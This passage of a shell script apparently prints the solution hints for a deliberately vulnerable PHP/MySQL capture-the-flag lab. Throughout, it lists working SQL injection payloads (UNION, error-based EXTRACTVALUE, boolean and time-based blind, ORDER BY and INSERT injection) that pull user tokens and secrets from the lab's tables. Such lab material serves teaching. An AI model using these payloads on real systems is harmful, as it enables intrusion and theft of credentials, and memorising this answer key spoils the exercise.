...
echo "    search.php?q=' UNION SELECT 1,username,token,4,5,6 FROM tbl_users WHERE role='admin' -- -             "
echo "    → extracts the admin API token.                      "
echo "                                                         "
echo "  Flag 4 (Medium  —  error-based EXTRACTVALUE)           "
echo "    search.php?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT token FROM tbl_users WHERE username='staff'))) OR '1'='1                               "
echo "    → leaks the staff token in a MySQL XPATH error.      "
echo "                                                         "
echo "  Flag 5 (Hard  —  boolean blind)                        "
echo "    user-check.php?id=1 AND (SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='intern')='D'                                      "
echo "    → \"User found\" vs \"User not found\" oracle.           "
echo "      Extract the intern token char by char.             "
echo "                                                         "
echo "  Flag 6 (Hard  —  time-based blind)                     "
echo "    list-task.php?list_id=1 AND IF( (SELECT SUBSTRING(token,N,1) FROM tbl_users WHERE username='contractor')='X',SLEEP(2),0)       "
echo "    → ~2s delay if char matches.                         "
echo "    Extract the contractor token char by char.         "
echo "                                                         "
...
echo "    profile.php?user_id=1 UNION SELECT 1,token,3 FROM tbl_users WHERE username='manager' -- -       "
echo "    → extracts the manager API token.                    "
echo "                                                         "
echo "  Flag 9 (Hard  —  ORDER BY SQLi)                        "
echo "    index.php?sort=(SELECT IF(SUBSTRING(secret_value,1,1)='D',SLEEP(2),0) FROM tbl_secrets WHERE secret_key='order_by_flag')      "
echo "    → ~2s delay if char matches.                         "
echo "                                                         "
echo "  Flag 10 (Hard  —  INSERT SQLi)                         "
echo "    contact.php (Submit in Name field)                   "
echo "    test',(SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT secret_value FROM tbl_secrets WHERE secret_key='admin_email_flag')))),'message')-- -   "
